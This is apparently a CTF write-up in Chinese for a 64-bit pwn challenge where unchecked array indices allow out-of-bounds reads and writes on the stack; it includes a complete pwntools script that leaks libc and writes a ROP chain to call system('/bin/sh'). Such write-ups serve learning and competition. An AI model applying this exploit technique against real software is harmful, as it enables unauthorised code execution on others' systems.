---
title: Read&Write
date: 2023-01-02 19:54:26
categories: 
- pwn_wp
tags: 
- pwn
- index overflow

---

NewStar，感觉是纯算偏移的题

64位栈溢出（但不是通常的栈溢出），保护全开。

<!-- more -->

程序中有Read和Write两个功能，会对栈上的一个变量num(rbp-0x410)，进行读写，在汇编中可以看到每个idx对应4byte。

```c
.text:0000000000000A8D                 mov     eax, [rbp+num_to_write]
.text:0000000000000A93                 mov     ecx, [rbp+idx]
.text:0000000000000A99                 mov     edx, eax
.text:0000000000000A9B                 mov     eax, ecx
.text:0000000000000A9D                 mov     [rbp+rax*4+nums], edx
```

主要的漏洞在于没有对下标进行检查，相当于可以任意读和任意写。

首先我们要先泄露libc地址，通过Read rip处的内容(num+0x420)，处理后可得到libcbase。

```python
#leak libc
read_num(0x108)
ru('The num: ')
data1=eval(ru('\n')[:-1])
read_num(0x109)
ru('The num: ')
data2=eval(ru('\n')[:-1])

leak('data1',hex(data1))
leak('data2',hex(data2))
libcbase=u64((p32(data1)+p16(data2)).ljust(8,'\x00'))-0x221620#偏移是调试的时候算出来的
leak('libcbase',hex(libcbase))
```

leak libcbase之后，我们就可以得到ret、pop_rdi、system和/bin/sh的地址。

之后通过Write将地址写进去就可以了，只是处理输入有些麻烦。

```python
# get shell

# ret
payload1=u32(p64(ret_addr)[:4])
payload2=u16(p64(ret_addr)[4:6])
leak('payload1',hex(payload1))
leak('payload2',hex(payload2))
write_num(0x106,payload1)
write_num(0x107,payload2)

# rip
payload1=u32(p64(pop_rdi)[:4])
payload2=u16(p64(pop_rdi)[4:6])
leak('payload1',hex(payload1))
leak('payload2',hex(payload2))
write_num(0x108,payload1)
write_num(0x109,payload2)


#binsh
payload1=u32(p64(binsh_addr)[:4])
payload2=u16(p64(binsh_addr)[4:6])
leak('payload1',hex(payload1))
leak('payload2',hex(payload2))
write_num(0x10a,payload1)
write_num(0x10b,payload2)

#system
payload1=u32(p64(sys_addr)[:4])
payload2=u16(p64(sys_addr)[4:6])
leak('payload1',hex(payload1))
leak('payload2',hex(payload2))
write_num(0x10c,payload1)
write_num(0x10d,payload2)
```

exp:

```python
from pwn import*
context(log_level='debug',os='linux',arch='amd64')
filename='pwn2'
elf=ELF('./'+filename)
libc=ELF('./libc-2.31.so')
p=process('./'+filename)
#p=remote('',)

s       = lambda data               :p.send(data)
sl      = lambda data               :p.sendline(data)
r       = lambda num=4096           :p.recv(num)
rl      = lambda num=4096           :p.recvline(num)
ru      = lambda x                  :p.recvuntil(x)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\x00'))
uu64    = lambda data               :u64(data.ljust(8,'\x00'))
leak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))

def debug(cmd='\n'):
  gdb.attach(p,cmd)
  pause()

def read_num(idx):
  ru('> ')
  sl('1')
  ru('Idx:')
  sl(str(idx))

def write_num(idx,num):
  ru('> ')
  sl('2')
  ru('Idx:')
  sl(str(idx))
  ru('Num:')
  sl(str(num))


# leak libc
read_num(0x108)
ru('The num: ')
data1=eval(ru('\n')[:-1])
read_num(0x109)
ru('The num: ')
data2=eval(ru('\n')[:-1])

# 0x7f2de618e000 0x7f576d980000
# 0x7f2de63af620 0x7f576dba1620
# offset=0x221620      0x221620 

leak('data1',hex(data1))
leak('data2',hex(data2))
libcbase=u64((p32(data1)+p16(data2)).ljust(8,'\x00'))-0x221620
leak('libcbase',hex(libcbase))

sys_addr=libcbase+libc.sym['system']
binsh_addr=libcbase+0x00000000001b45bd
pop_rdi=libcbase+0x0000000000023b6a
ret_addr=libcbase+0x0000000000022679
leak('system',hex(sys_addr))
leak('binsh',hex(binsh_addr))
leak('pop rdi',hex(pop_rdi))
leak('ret',hex(ret_addr))

# Overwrite

# ret
payload1=u32(p64(ret_addr)[:4])
payload2=u16(p64(ret_addr)[4:6])
leak('payload1',hex(payload1))
leak('payload2',hex(payload2))
write_num(0x106,payload1)
write_num(0x107,payload2)

# rip
payload1=u32(p64(pop_rdi)[:4])
payload2=u16(p64(pop_rdi)[4:6])
leak('payload1',hex(payload1))
leak('payload2',hex(payload2))
write_num(0x108,payload1)
write_num(0x109,payload2)

#binsh
payload1=u32(p64(binsh_addr)[:4])
payload2=u16(p64(binsh_addr)[4:6])
leak('payload1',hex(payload1))
leak('payload2',hex(payload2))
write_num(0x10a,payload1)
write_num(0x10b,payload2)

#system
payload1=u32(p64(sys_addr)[:4])
payload2=u16(p64(sys_addr)[4:6])
leak('payload1',hex(payload1))
leak('payload2',hex(payload2))
write_num(0x10c,payload1)
write_num(0x10d,payload2)

# get shell
ru('> ')
#debug('b main')
sl('0')

itr()
```